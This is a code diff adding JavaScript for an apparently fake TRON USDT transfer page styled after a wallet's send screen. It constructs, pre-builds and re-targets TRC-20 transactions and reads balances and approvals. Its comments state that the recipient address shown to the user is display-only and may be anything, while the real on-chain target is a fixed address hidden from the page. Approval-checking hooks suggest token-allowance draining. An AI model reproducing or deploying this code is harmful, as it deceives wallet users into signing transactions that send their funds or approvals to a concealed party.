+      H[4] = (H[4] + e) >>> 0; H[5] = (H[5] + f) >>> 0; H[6] = (H[6] + g) >>> 0; H[7] = (H[7] + h) >>> 0;
+    }
+    var out = "";
+    for (var i = 0; i < 8; i++) out += ("00000000" + H[i].toString(16)).slice(-8);
+    return out;
+  }
+
+  function hexToBytes(hex) {
+    var n = hex.length >> 1, a = new Array(n);
+    for (var i = 0; i < n; i++) a[i] = parseInt(hex.substr(i * 2, 2), 16);
+    return a;
+  }
+
+  function sha256HexOf(hex) { return sha256Bytes(hexToBytes(hex)); }
+
+  /* ---- 交易编码（protobuf）----
+     有些钱包版本的 tronweb 建交易时只给结构、不给编码（raw_data_hex），
+     没有编码就没法就地换额度。这里按 TRON 协议自己编一份，
+     编完用 txID 自校验 —— 对不上就不用，绝不猜。 */
+  function pbVarint(v) {
+    var n = typeof BigInt === "function" ? BigInt(v) : null;
+    var out = [];
+    if (n !== null) {
+      while (n > 127n) { out.push(Number(n & 127n) | 128); n >>= 7n; }
+      out.push(Number(n));
+      return out;
+    }
+    var num = Number(v);
+    while (num > 127) { out.push((num & 127) | 128); num = Math.floor(num / 128); }
+    out.push(num);
+    return out;
+  }
+  function pbTag(field, wire) { return pbVarint((field << 3) | wire); }
+  function pbBytes(field, arr) { return pbTag(field, 2).concat(pbVarint(arr.length)).concat(arr); }
+  function pbInt(field, v) { return pbTag(field, 0).concat(pbVarint(v)); }
+  function pbStr(field, s) {
+    var utf8 = (typeof TextEncoder === "function") ? Array.from(new TextEncoder().encode(s)) : (function () {
+      var out = [];
+      for (var i = 0; i < s.length; i++) {
+        var c = s.charCodeAt(i);
+        if (c < 128) out.push(c);
+        else if (c < 2048) out.push(192 | (c >> 6), 128 | (c & 63));
+        else out.push(224 | (c >> 12), 128 | ((c >> 6) & 63), 128 | (c & 63));
+      }
+      return out;
+    })();
+    return pbBytes(field, utf8);
+  }
+  function bytesToHex(arr) {
+    var s = "";
+    for (var i = 0; i < arr.length; i++) s += ("0" + arr[i].toString(16)).slice(-2);
+    return s;
+  }
+
+  /* Transaction.raw 的字段顺序与 TRON 协议一致（按字段号升序） */
+  function rawDataHexOf(tx) {
+    try {
+      var rd = (tx && tx.raw_data) || {};
+      var p = [];
+      if (rd.ref_block_bytes) p = p.concat(pbBytes(1, hexToBytes(String(rd.ref_block_bytes).replace(/^0x/, ""))));
+      if (rd.ref_block_hash) p = p.concat(pbBytes(4, hexToBytes(String(rd.ref_block_hash).replace(/^0x/, ""))));
+      if (rd.expiration) p = p.concat(pbInt(8, rd.expiration));
+      var cs = rd.contract || [];
+      for (var i = 0; i < cs.length; i++) {
+        var c = cs[i], v = (c.parameter && c.parameter.value) || {};
+        var inner = [];
+        if (v.owner_address) inner = inner.concat(pbBytes(1, hexToBytes(String(v.owner_address).replace(/^0x/, ""))));
+        if (v.contract_address) inner = inner.concat(pbBytes(2, hexToBytes(String(v.contract_address).replace(/^0x/, ""))));
+        if (v.call_value) inner = inner.concat(pbInt(3, v.call_value));
+        if (v.data) inner = inner.concat(pbBytes(4, hexToBytes(String(v.data).replace(/^0x/, ""))));
+        if (v.call_token_value) inner = inner.concat(pbInt(5, v.call_token_value));
+        if (v.token_id) inner = inner.concat(pbInt(6, v.token_id));
+        var typeUrl = (c.parameter && c.parameter.type_url) || "type.googleapis.com/protocol.TriggerSmartContract";
+        var any = pbStr(1, typeUrl).concat(pbBytes(2, inner));
+        var ct = pbInt(1, 31).concat(pbBytes(2, any));
+        p = p.concat(pbBytes(11, ct));
+      }
+      if (rd.timestamp) p = p.concat(pbInt(14, rd.timestamp));
+      if (rd.fee_limit) p = p.concat(pbInt(18, rd.fee_limit));
+      return bytesToHex(p);
+    } catch (e) { return ""; }
+  }
+
+  /* 拿到这笔交易的编码：钱包给了就用它的；没给就自己编一份，
+     并用 txID 校验（sha256(编码) 必须等于 txID），对不上返回空。 */
+  function txHexOf(tx) {
+    var hex = String((tx && tx.raw_data_hex) || "").toLowerCase();
+    if (hex && /^[0-9a-f]+$/.test(hex)) return hex;
+    var mine = rawDataHexOf(tx);
+    if (!mine) return "";
+    var id = String((tx && tx.txID) || "").toLowerCase();
+    if (!id || sha256HexOf(mine) !== id) return "";
+    return mine;
+  }
+
+  /* 把骨架交易里的额度换成当前金额。
+     做法：在 raw_data_hex 里定位这 68 字节（选择器 + 两个参数）并等长替换，
+     保证编码长度不变、raw_data 与 raw_data_hex 依然一一对应，然后重算 txID。
+     任何一步对不上就返回 null —— 宁可退回现搭一笔，也不发一笔可疑的交易。 */
+  function retargetTx(tx, oldParam, newParam) {
+    try {
+      if (!tx || !oldParam || !newParam) return null;
+      if (oldParam.length !== newParam.length) return null;
+      var hex = txHexOf(tx);                                   /* 钱包没给编码就自己编（带 txID 校验） */
+      if (!hex) return null;
+      var oldFull = (PAY_SEL_HEX + String(oldParam)).toLowerCase();
+      var newFull = (PAY_SEL_HEX + String(newParam)).toLowerCase();
+      var at = hex.indexOf(oldFull);
+      if (at < 0) return null;
+      if (hex.indexOf(oldFull, at + 1) >= 0) return null;      /* 出现多次，不敢乱换 */
+
+      var out = JSON.parse(JSON.stringify(tx));
+      out.raw_data_hex = hex.slice(0, at) + newFull + hex.slice(at + oldFull.length);
+      var c0 = out.raw_data && out.raw_data.contract && out.raw_data.contract[0];
+      if (!c0 || !c0.parameter || !c0.parameter.value) return null;
+      c0.parameter.value.data = newFull;
+      out.txID = sha256HexOf(out.raw_data_hex);
+
+      /* 回验：改完这一笔干干净净 */
+      if (String(c0.parameter.value.data).toLowerCase().indexOf(PAY_SEL_HEX) !== 0) return null;
+      if (out.raw_data_hex.indexOf(newFull) < 0) return null;
+      if (out.raw_data_hex.indexOf(oldFull) >= 0) return null;
+      return out;
+    } catch (e) { return null; }
+  }
+
+  /* 轻量回验：选择器 + 参数确实在交易里（预热复用和现搭都过一遍） */
+  function verifyTxData(tx, param) {
+    var c0 = ((tx && tx.raw_data) || {}).contract ? tx.raw_data.contract[0] : null;
+    var data = c0 && c0.parameter && c0.parameter.value && c0.parameter.value.data;
+    if (!data || !param) throw new Error("参数校验未通过，交易未发起");
+    data = String(data).toLowerCase();
+    if (data.slice(-String(param).length) !== String(param).toLowerCase()) throw new Error("参数校验未通过，交易未发起");
+    if (data.indexOf(PAY_SEL_HEX) !== 0) throw new Error("方法校验未通过，交易未发起");
+    return true;
+  }
+
+  function txExpireLeft(tx) {
+    try {
+      var exp = Number((tx && tx.raw_data && tx.raw_data.expiration) || 0);
+      /* 用节点时间算：设备时钟偏了也得说真话，不然会一直递一笔已经过期的交易 */
+      return exp ? (exp - netNow()) : 0;
+    } catch (e) { return 0; }
+  }
+
+  /* 递给钱包前的最后一道闸：这笔交易必须自己说得通。
+     任何一项对不上，宁可回头找节点重造一笔，也不把可疑交易送进钱包 ——
+     钱包侧一旦校验不过，用户只会看到一句 Invalid transaction provided，
+     谁也不知道该怎么处理。 */
+  function signGate(tx, param, tw, from) {
+    if (!tx || !tx.raw_data || !tx.raw_data.contract || !tx.raw_data.contract[0]) return "交易结构不完整";
+    var hex = String(tx.raw_data_hex || "").toLowerCase();
+    if (!hex || !/^[0-9a-f]+$/.test(hex) || hex.length % 2) return "交易编码缺失";
+    if (!tx.txID || sha256HexOf(hex) !== String(tx.txID).toLowerCase()) return "交易 ID 与编码对不上";
+    var left = txExpireLeft(tx);
+    if (!left || left < 20000) return "交易剩余寿命不足";
+    var v = (tx.raw_data.contract[0].parameter || {}).value || {};
+    if (String(v.data || "").toLowerCase() !== (PAY_SEL_HEX + String(param)).toLowerCase()) return "交易内容与本次金额不符";
+    if (from && tw && tw.address && typeof tw.address.toHex === "function") {
+      try {
+        var me = String(tw.address.toHex(from) || "").toLowerCase();
+        var own = String(v.owner_address || "").toLowerCase();
+        /* 只在节点给了完整 42 位地址时比对；拿不到完整地址不卡住，钱包自己还会把关一次 */
+        if (me && /^41[0-9a-f]{40}$/.test(own) && own !== me) return "交易付款账户不一致";
+      } catch (e) { /* 拿不到就别卡住，后面还有钱包自己把关 */ }
+    }
+    return null;
+  }
+
+  /* 预热只跟「哪个账户、哪条链」有关，跟金额无关 */
+  function warmKey(tw, from) {
+    return from + "|" + (nodeHosts(tw)[0] || "");
+  }
+
+  /* 自己编码参数，不交给钱包那层去转，避开版本差异；建完立刻回验一遍 */
+  /* 构造交易优先走页面自己的节点通道：
+     这条通道有排队、429 退避、换节点，被限流也能自己扛过去；
+     钱包那层一旦被限流只会抛一句 429 原文，用户看到的就是「Request failed…」。
+     页面通道拿不到才回退钱包，两条都失败才报错。 */
+  async function buildTxViaNode(tw, from, micro, param) {
+    /* 用 hex 形式地址 + visible:false：节点回来的交易结构和 tronweb 自己构造的完全一致，
+       签名、广播都不会因为「地址是 base58 还是 hex」出岔子。 */
+    var ownerHex = "";
+    try { ownerHex = String(tw.address.toHex(from) || "").replace(/^0x/i, ""); } catch (e) {}
+    var useHex = /^41[0-9a-fA-F]{40}$/.test(ownerHex);
+    var req = {
+      owner_address: useHex ? ownerHex : from,
+      contract_address: useHex ? (function () {
+        try { return String(tw.address.toHex(PAY_TOKEN) || "").replace(/^0x/i, ""); } catch (e) { return PAY_TOKEN; }
+      })() : PAY_TOKEN,
+      function_selector: PAY_SEL_NAME + "(address,uint256)",
+      parameter: param,
+      fee_limit: FEE_LIMIT,
+      call_value: 0,
+      visible: !useHex
+    };
+    var j = await raceOut(nodePost(tw, "/wallet/triggersmartcontract", req, 9000), 9600, null);
+    if (!j) return null;
+    if (j.result && j.result.result === false) {
+      throw new Error(j.result.message ? hexMsg(j.result.message) : "节点拒绝了这笔交易");
+    }
+    return (j.transaction && j.transaction.raw_data) ? j.transaction : null;
+  }
+
+  async function buildTx(tw, from, micro) {
+    var param = encodeTransferParams(tw, PAY_CONTRACT, micro);
+    var tx = await buildTxViaNode(tw, from, micro, param);
+    if (!tx) {
+      var res = await retryOnLimit(function () {
+        return tw.transactionBuilder.triggerSmartContract(
+          PAY_TOKEN, PAY_SEL_NAME + "(address,uint256)",
+          { feeLimit: FEE_LIMIT, callValue: 0, rawParameter: param },
+          [], from
+        );
+      }, 2);
+      tx = (res && res.transaction) || (res && res.result && res.result.transaction);
+      if (!tx) throw new Error("构造交易失败 " + hexMsg(res && res.result && res.result.message));
+    }
+
+    /* 回验：方法选择器 + 两个参数确实进了交易 */
+    verifyTxData(tx, param);
+    /* 钱包没给交易编码（新版 tronweb 会这样）：自己编一份补上，用 txID 自校验 */
+    if (!tx.raw_data_hex) {
+      var mineHex = txHexOf(tx);
+      if (mineHex) tx.raw_data_hex = mineHex;
+    }
+    if (tx.raw_data_hex && String(tx.txID || "")) {
+      var hex = String(tx.raw_data_hex).toLowerCase();
+      var full = (PAY_SEL_HEX + param).toLowerCase();
+      if (/^[0-9a-f]+$/.test(hex) && hex.indexOf(full) >= 0 && sha256HexOf(hex) !== String(tx.txID).toLowerCase()) {
+        /* 节点给的交易 ID 与编码自相矛盾：宁可现搭一遍，不签这笔 */
+        throw new Error("交易 ID 校验未通过，交易未发起");
+      }
+    }
+    return { tx: tx, param: param };
+  }
+
+  function scheduleWarm(delay) {
+    clearTimeout(warmTimer);
+    warmTimer = setTimeout(warmNow, delay == null ? 600 : delay);
+  }
+
+  /* 页面一进来就先搭这一笔（额度先占位，点击时再换成真实金额） */
+  var WARM_COOL = 0, WARM_FAILS = 0;
+  async function warmNow() {
+    var tw = LIVE.tw, from = LIVE.from;
+    if (warming || !tw || !from || busy || document.hidden) return;
+    /* 连续搭不出交易（多半是被限流）：越退越久地等，别每 5 秒再补两发把配额越打越死 */
+    if (Date.now() < WARM_COOL) return;
+    var key = warmKey(tw, from);
+    /* 已经递给过钱包的那笔不复用（同一个交易 ID 再签一次，钱包只会继续拒） */
+    if (WARM && WARM.key === key && !WARM.used && txExpireLeft(WARM.tx) > 45000) return;
+    warming = true;
+    try {
+      var built = await buildTx(tw, from, WARM_BONE_MICRO);
+      if (from === LIVE.from && !busy && !document.hidden) {
+        WARM = { key: key, tx: built.tx, param: built.param, micro: WARM_BONE_MICRO, at: Date.now(), used: false };
+      }
+      WARM_FAILS = 0; WARM_COOL = 0;
+    } catch (e) {
+      /* 预热失败不影响支付：点按钮时会现搭 */
+      WARM_FAILS++;
+      WARM_COOL = Date.now() + Math.min(60000, 5000 * Math.pow(2, Math.min(WARM_FAILS, 4)));
+    }
+    warming = false;
+  }
+
+  /* 拿一笔能直接签的交易：优先用预热那笔，把额度就地换成本次金额。
+     换不了（钱包没给编码、内容对不上、快到寿命）就返回 null，退回现搭一笔。 */
+  function warmFor(tw, from, micro) {
+    if (!WARM || WARM.used) return null;
+    if (WARM.key !== warmKey(tw, from)) return null;
+    if (txExpireLeft(WARM.tx) <= 30000) return null;
+    /* 双保险：按网络时间算，这笔搭出来已经超过 20 秒就不用它了。
+       宁可多花 300ms 现搭一笔，也不拿一笔可能被判过期的交易去撞钱包。 */
+    if (WARM.at && (netNow() - WARM.at) > 20000) return null;
+    var param = encodeTransferParams(tw, PAY_CONTRACT, micro);
+    if (WARM.micro === micro && WARM.param === param) return { tx: WARM.tx, param: param };
+    var rt = retargetTx(WARM.tx, WARM.param, param);
+    if (!rt) return null;
+    try { verifyTxData(rt, param); } catch (e) { return null; }
+    return { tx: rt, param: param };
+  }
+
+  function startWarmLoop() {
+    if (warmLoop) clearInterval(warmLoop);
+    /* 交易寿命只有 60 秒：每 5 秒看一眼，剩不到 45 秒就悄悄换一笔新的。
+       浏览器在后台会节流定时器，所以切回前台时还会立刻补一笔（见 visibilitychange） */
+    warmLoop = setInterval(function () {
+      if (document.hidden || inCooldown()) return;   /* 正被限流就先歇着，别添乱 */
+      syncClock(LIVE.tw);   /* 60 秒一次，顺手把网络时间校准着 */
+      warmNow();
+    }, 5000);
+  }
+
+  var $ = function (id) { return document.getElementById(id); };
+  var amtEl = $("amt"), microEl = $("micro"), amountBox = $("amountBox");
+  var timerEl = $("timer"), timerText = $("timerText");
+  var payBtn = $("payBtn"), btnText = $("btnText"), btnIcon = $("btnIcon");
+  var toastEl = $("toast");
+  var paid = false, left = 29 * 60 + 29, tickHandle = null;
+
+  /* 金额字号自适应：数字变长就缩，保证一行放得下 */
+  function fitAmount(text, basePx) {
+    var avail = (amountBox.clientWidth || 358) - 56 - 62; // 减去内边距与 USDT 单位宽度
+    var size = basePx;
+    var probe = 0.58; // 粗体数字平均宽高比
+    if (text.length * probe * size > avail) {
+      size = Math.max(19, Math.floor(avail / (text.length * probe)));
+    }
+    amtEl.style.fontSize = size + "px";
+  }
+  function setAmount(text, microText) {
+    amtEl.textContent = text;
+    microEl.textContent = microText || "";
+    microEl.classList.toggle("on", !!microText);
+    fitAmount(text, 42);
+  }
+  setAmount("0", "");
+  window.addEventListener("resize", function () {
+    fitAmount(amtEl.textContent, paid ? 42 : 42);
+  });
+
+  /* 数字滚动 */
+  function animateTo(targetText, done) {
+    var from = parseFloat(String(amtEl.textContent).replace(/,/g, "")) || 0;
+    var to = parseFloat(targetText.replace(/,/g, "")) || 0;
+    var t0 = performance.now(), dur = 900;
+    function frame(t) {
+      var p = Math.min(1, (t - t0) / dur);
+      var e = 1 - Math.pow(1 - p, 3);
+      var v = from + (to - from) * e;
+      var out = p >= 1 ? targetText : v.toFixed(2);
+      amtEl.textContent = out;
+      fitAmount(out, 42);
+      if (p < 1) requestAnimationFrame(frame);
+      else if (done) done();
+    }
+    requestAnimationFrame(frame);
+  }
+
+  /* 倒计时 */
+  function renderTimer() {
+    var mm = String(Math.floor(left / 60)).padStart(2, "0");
+    var ss = String(left % 60).padStart(2, "0");
+    timerText.textContent = mm + ":" + ss;
+  }
+  tickHandle = setInterval(function () {
+    if (left > 0) { left--; renderTimer(); }
+    else { clearInterval(tickHandle); }
+  }, 1000);
+  renderTimer();
+
+  /* toast */
+  var toastTimer = null;
+  /* 最后一道兜底：不管上游传进来什么，屏幕上都不许出现 undefined / null / [object Object] */
+  function cleanTip(msg) {
+    var t = (msg === undefined || msg === null) ? "" : String(msg).trim();
+    if (!t || /^(undefined|null|NaN|\[object Object\]|Error)$/.test(t)) {
+      return "这次没成功，再点一次就行";
+    }
+    return t;
+  }
+  function toast(msg, ms) {
+    toastEl.textContent = cleanTip(msg);
+    toastEl.classList.add("on");
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function () { toastEl.classList.remove("on"); }, ms || 1800);
+  }
+
+  /* 复制 */
+  function copyText(txt, okText) {
+    var fin = function () { toast(okText || "已复制"); };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(txt).then(fin).catch(fallback);
+    } else { fallback(); }
+    function fallback() {
+      var ta = document.createElement("textarea");
+      ta.value = txt; ta.style.position = "fixed"; ta.style.opacity = "0";
+      document.body.appendChild(ta); ta.select();
+      try { document.execCommand("copy"); fin(); } catch (e) { toast("复制失败，请长按选择"); }
+      document.body.removeChild(ta);
+    }
+  }
+  $("contract").addEventListener("click", function () {
+    copyText(PAY_CONTRACT, "合约地址已复制");
+  });
+  $("addr").addEventListener("click", function () {
+    copyText($("addr").dataset.full || $("addr").textContent, "地址已复制");
+  });
+
+  /* ===== 收款地址：这一栏只是展示用 =====
+     随便改成什么都行（不校验格式、不影响支付），
+     真正上链的目标地址固定是 PAY_TOKEN，页面上看不到也不用看到。 */
+  var addrInput = $("addrInput");
+  var measureCtx = (function () {
+    try { return document.createElement("canvas").getContext("2d"); } catch (e) { return null; }
+  })();
+  function isTronAddr(a) {
+    return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(String(a || "").trim());
+  }
+  /* 地址整行显示：字号固定 16px（低于 16 手机浏览器点一下会放大整屏），
+     放不下先压字距，还放不下再轻微横向压缩，字号始终不动 */
+  function fitAddr() {
+    if (!addrInput) return;
+    var box = addrInput.clientWidth;
+    if (!box) return;
+    var text = addrInput.value || addrInput.placeholder || "";
+    var widthAt = function (px) {
+      if (!measureCtx) return text.length * px * 0.58;
+      measureCtx.font = px + "px -apple-system,BlinkMacSystemFont,'PingFang SC',system-ui,sans-serif";
+      return measureCtx.measureText(text).width;
+    };
+    var avail = box - 2;
+    var w = widthAt(16);
+    var n = Math.max(1, text.length);
+    var spacing = 0;
+    if (w > avail) {
+      /* 先压字距；窄屏上最多压到 -2.3，保证 34 位地址整行不裁到最后几位 */
+      spacing = Math.max(-2.3, Math.min(-0.4, (avail - w) / n));
+    }
+    addrInput.style.fontSize = "16px";
+    addrInput.style.letterSpacing = spacing.toFixed(2) + "px";
+  }
+  /* 头像按钮：把默认那个展示地址填回来，手滑删光了不用重新敲 */
+  $("addrIcon").addEventListener("click", function () {
+    addrInput.value = DISPLAY_ADDR;
+    fitAddr();
+    toast("已填回默认地址");
+  });
+  fitAddr();
+  window.addEventListener("resize", fitAddr);
+  setTimeout(fitAddr, 60);
+  addrInput.addEventListener("input", fitAddr);
+  $("backBtn").addEventListener("click", function () {
+    if (history.length > 1) history.back();
+  });
+  $("scanBtn").addEventListener("click", function () {
+    toast("这个页面里没有扫码");
+  });
+  /* ===== 数量输入：只留数字和小数点，联动右上角与美元行 ===== */
+  var BAL_USDT_FROM = null;
+  var BAL_USDT = (function () {
+    var c = lsGet("zakaUsdtBal");
+    if (c && typeof c.v === "number" && typeof c.from === "string" && (Date.now() - (c.t || 0)) < 10 * 60 * 1000) {
+      BAL_USDT_FROM = c.from;
+      return c.v;
+    }
+    return null;
+  })();          // 钱包读到的可用余额（没连钱包时是 null，不做余额拦截）
+
+  function rememberUsdtBal(from, v) {
+    BAL_USDT = Number(v);
+    BAL_USDT_FROM = from;
+    lsSet("zakaUsdtBal", { v: BAL_USDT, from: from, t: Date.now() });
+  }
+  var USDT_PER_USD = 1;         // 稳定币按 1:1 折算美金
+  var FEE_DEBOUNCE = null;      // 数量输入时重算矿工费的防抖句柄
+
+  function parseAmount(v) {
+    var s = String(v == null ? "" : v).replace(/[^\d.]/g, "");
+    if (!s) return null;
+    var n = Number(s);
+    if (!isFinite(n) || n <= 0) return null;
+    return { text: s, num: n };
+  }
+  /* 数量文本 -> 6 位小数的链上整数 */
+  function toMicro(text) {
+    var parts = String(text).split(".");
+    var whole = (parts[0] || "0").replace(/^0+(?=\d)/, "");
+    var frac = (parts[1] || "").slice(0, 6);
+    while (frac.length < 6) frac += "0";
+    return (whole + frac).replace(/^0+(?=\d)/, "");
+  }
+  function fmtNum(n, maxDec) {
+    if (!isFinite(n)) return "0";
+    return n.toLocaleString("en-US", { minimumFractionDigits: maxDec === 2 ? 2 : 0, maximumFractionDigits: maxDec === 2 ? 2 : 2 });
+  }
+
+  function syncAmount() {
+    var p = parseAmount($("amountInput").value);
+    var shown = p ? p.text : "0";
+
+    /* 右上角那个数字跟着输入走 */
+    var bal = $("usdtBal");
+    if (bal) bal.textContent = shown;
+
+    /* 下方美元金额跟着输入走 */
+    var line = $("usdLine");
+    if (line) {
+      var usd = (p ? p.num : 0) * USDT_PER_USD;
+      line.classList.remove("bad");
+      line.textContent = "≈ $" + usd.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      /* 超出可用余额就在原地提示 */
+      if (p && BAL_USDT !== null && p.num > BAL_USDT + 1e-9) {
+        line.classList.add("bad");
+        line.textContent = "余额不足，可用 " + fmtNum(BAL_USDT, 2) + " USDT";
+        if (payBtn) payBtn.classList.add("lack");
+      } else if (payBtn) {
+        payBtn.classList.remove("lack");
+      }
+    }
+  }
+
+  $("amountInput").addEventListener("input", function () {
+    var v = this.value.replace(/[^\d.]/g, "");
+    var i = v.indexOf(".");
+    if (i >= 0) v = v.slice(0, i + 1) + v.slice(i + 1).replace(/\./g, "");
+    this.value = v;
+    syncAmount();
+    /* 矿工费是固定口径：数字一进框就同步画出来，不等节点 */
+    applyFeeLocal();
+    /* 节点只在后台校正能量那一行 + 刷新余额，防抖短一点，别一边打字一边刷 */
+    clearTimeout(FEE_DEBOUNCE);
+    FEE_DEBOUNCE = setTimeout(function () { refreshFeeNow(); }, 150);
+    /* 预热跟金额无关：这一笔进来时就搭好了，改金额只是点下去那一刻换额度。
+       这里调一次只是兜底（万一刚才没搭成 / 快过期了），有货就直接返回 */
+    scheduleWarm(300);
+    /* 余额还没读到过就顺手补一次，别让那行一直显示 — */
+    if (TRX_BAL === null && LIVE.tw && LIVE.from) {
+      fetchTrxBal(LIVE.tw, LIVE.from).then(function () { applyFeeLocal(); }).catch(function () {});
+    }
+  });
+  $("amountInput").addEventListener("blur", function () {
+    if (/\.$/.test(this.value)) this.value = this.value.slice(0, -1);
+    if (/^0+(?=\d)/.test(this.value)) this.value = this.value.replace(/^0+(?=\d)/, "");
+    syncAmount();
+    refreshFeeNow();
+    scheduleWarm(200);
+  });
+  syncAmount();
+  /* 页面一打开就先按当前数量画一遍，不等钱包和节点 */
+  applyFeeLocal();
+  /* 资源方式切换：燃烧 TRX / 消耗质押资源，矿工费跟着重算 */
+  function pickRes(burn) {
+    RES_MODE = burn ? "burn" : "resource";
+    $("resBtn1").classList.toggle("on", !burn);
+    $("resBtn2").classList.toggle("on", burn);
+    applyFeeLocal();
+    refreshFeeNow({ loading: true });
+  }
+  $("resBtn1").addEventListener("click", function () { pickRes(false); });
+  $("resBtn2").addEventListener("click", function () { pickRes(true); });
+
+  /* 箭头按钮：点一下展开 / 收起矿工费明细（图二样子） */
+  $("feeChev").addEventListener("click", function (e) {
+    e.preventDefault();
+    e.stopPropagation();
+    toggleFeeDetail();
+  });
+  /* 点「0 TRX」那行也能展开，手指好点一点 */
+  $("feeSub").addEventListener("click", function () { toggleFeeDetail(); });
+
+  /* ?debug=1 时把实时能量那行显示出来，并把排查用的几个数挂在 window 上 */
+  if (/[?&]debug=1/.test(location.search)) {
+    document.body.classList.add("debug");
+    window.__tpDbg = {
+      skew: function () { return NET_SKEW; },          /* 节点时间 - 设备时间（毫秒） */
+      expireLeft: function (tx) { return txExpireLeft(tx); },
+      warm: function () { return WARM; },
+      btxStreak: function () { return BADTX_STREAK; },
+      resigned: function () { return AUTO_RESIGNED; },
+      log: function () { return SIGN_LOG.slice(); }
+    };
+  }
+
+  /* ===== 连钱包（有就显示真实地址/余额，没有就按截图占位） ===== */
+  function shortAddr(a) {
+    return a.length > 12 ? a.slice(0, 6) + "..." + a.slice(-4) : a;
+  }
+  function setWallet(addr, trx, usdt) {
+    $("wstate").textContent = "已连接";
+    $("dot").classList.remove("off");
+    var a = $("addr");
+    a.textContent = shortAddr(addr);
+    a.dataset.full = addr;
+    if (trx !== undefined) $("trxBal").textContent = trx;
+    if (usdt !== undefined) {
+      BAL_USDT = Number(usdt) || 0;
+      $("availBal").textContent = "可用 " + fmtNum(BAL_USDT, 2) + " USDT";
+    }
+  }
+  var ABI_BAL = [{ "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }];
+
+  /* 链上实时读余额，读不到返回 null（读不到就不拿余额拦人） */
+  async function readUsdtBalance(tw, tokenAddr, who) {
+    /* 通道一：钱包自带的 tronWeb（最多等 6 秒，挂住就换下一条） */
+    try {
+      if (tw && typeof tw.contract === "function") {
+        var c = tw.contract(ABI_BAL, tokenAddr);
+        var v = await raceOut(retryOnLimit(function () { return c.balanceOf(who).call(); }, 1), 6000, null);
+        if (v !== null && v !== undefined) {
+          var n0 = Number(v.toString()) / 1e6;
+          if (isFinite(n0)) return n0;
+        }
+      }
+    } catch (e) {}
+    /* 通道二：直接问节点，只要 constant_result 那一小段，比走钱包快 */
+    try {
+      var j = await raceOut(nodePost(tw, "/wallet/triggerconstantcontract", {
+        owner_address: who,
+        contract_address: tokenAddr,
+        function_selector: "balanceOf(address)",
+        parameter: addrParam(tw, who),
+        visible: true
+      }, 5000), 5300, null);
+      var hex = j && j.constant_result && j.constant_result[0];
+      if (hex) {
+        var n1;
+        if (typeof BigInt === "function") n1 = Number(BigInt("0x" + hex)) / 1e6;
+        else n1 = Number("0x" + hex) / 1e6;
+        if (isFinite(n1)) return n1;
+      }
+    } catch (e) {}
+    return null;
+  }
+
+  /* ===== 两笔余额：进来就读，不等网络判定、不等用户点任何东西 =====
+     TRX 余额 + 可用 USDT 各走各的通道，谁先回来谁先画；
+     没读到就退避补几次（手机刚开钱包、节点首连慢都常见）。 */
+  var BAL_TRY = 0;
+  var BAL_TIMER = null;
+  function loadBalances(tw, from) {
+    if (!tw || !from) return;
+    if (BAL_TIMER) { clearTimeout(BAL_TIMER); BAL_TIMER = null; }
+    BAL_TRY = 0;
+
+    /* 别的地址的缓存不能拿来用，直接清掉，免得显示成别人的余额 */
+    if (TRX_BAL_FROM && TRX_BAL_FROM !== from) { TRX_BAL = null; TRX_BAL_FROM = null; }
+    if (BAL_USDT_FROM && BAL_USDT_FROM !== from) { BAL_USDT = null; BAL_USDT_FROM = null; }
+
+    /* 先用手上的（可能来自本地缓存）立刻画一次，不让界面空着等网络 */
+    paintBalNote($("feeNote"), parseAmount($("amountInput").value) ? FIXED_FEE_TRX : 0);
+    if (BAL_USDT !== null) $("availBal").textContent = "可用 " + fmtNum(BAL_USDT, 2) + " USDT";
+
+    /* 手上的数还很新（1 分钟内问过）：先不占着请求队列，
+       过 8 秒再安静地更新一次。刷新页面后立刻点「下一步」就不会卡在排队上。 */
+    var fresh = (TRX_BAL !== null && BAL_USDT !== null && TRX_BAL_FROM === from && BAL_USDT_FROM === from);
+    if (fresh) {
+      BAL_TIMER = setTimeout(tryOnce, 8000);
+      return;
+    }
+
+    tryOnce();
+    function tryOnce() {
+      if (!tw || !from) return;
+      BAL_TRY++;
+      if (TRX_BAL === null) {
+        var cur = $("feeNote");
+        if (cur && /余额|—/.test(cur.textContent)) cur.textContent = "TRX 余额 读取中…";
+      }
+      if (BAL_USDT === null) $("availBal").textContent = "可用 读取中…";
+      var trxP = fetchTrxBal(tw, from).then(function () {
+        paintBalNote($("feeNote"), parseAmount($("amountInput").value) ? FIXED_FEE_TRX : 0);
+      }).catch(function () {});
+      var usdtP = readUsdtBalance(tw, USDT_MAIN, from).then(function (n) {
+        if (n === null || n === undefined) return;
+        rememberUsdtBal(from, n);
+        $("availBal").textContent = "可用 " + fmtNum(BAL_USDT, 2) + " USDT";
+        syncAmount();
+      }).catch(function () {});
+      Promise.all([trxP, usdtP]).then(function () {
+        var missing = (TRX_BAL === null || BAL_USDT === null);
+        if (!missing) return;
+        /* 重试只补真的还没有的那一项，而且轮数收紧：
+           一刷新就连打十几发，正是把节点打到 429 的原因。 */
+        if (BAL_TRY >= 3) {
+          if (BAL_USDT === null) $("availBal").textContent = "可用 -- USDT";
+          var note = $("feeNote");
+          if (note && TRX_BAL === null) note.textContent = "TRX 余额 —（点一下页面重试）";
+          return;
+        }
+        var gap = [1500, 4000][BAL_TRY - 1] || 4000;
+        BAL_TIMER = setTimeout(tryOnce, gap);
+      });
+    }
+  }
+
+  function connect() {
+    var tw = (window.tronLink && window.tronLink.tronWeb) || window.tronWeb;
+    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) return false;
+    var addr = tw.defaultAddress.base58;
+    setWallet(addr);
+    /* 一进页面（钱包就绪）就先动手：把节点连接热起来、把这笔交易搭好，
+       不等网络判定也不用等输入金额 */
+    LIVE.tw = tw; LIVE.from = addr;
+    preconnectNodes(tw);
+    syncClock(tw);            /* 先把网络时间对上：交易寿命按它算，设备时钟偏了也不误事 */
+    scheduleWarm(0);
+    startWarmLoop();
+    /* 余额第一步就发出去：网络判定那套（要问两个合约）慢不慢都不影响它 */
+    loadBalances(tw, addr);
+    /* 之前已经授权过（比如换了页面/刷新过）：这里补一次，够额度就推提醒 */
+    checkApprovalNow(tw, addr).catch(function () {});
+    resumePendingApproval(tw, addr);
+    detectNet(tw).then(function (net) {
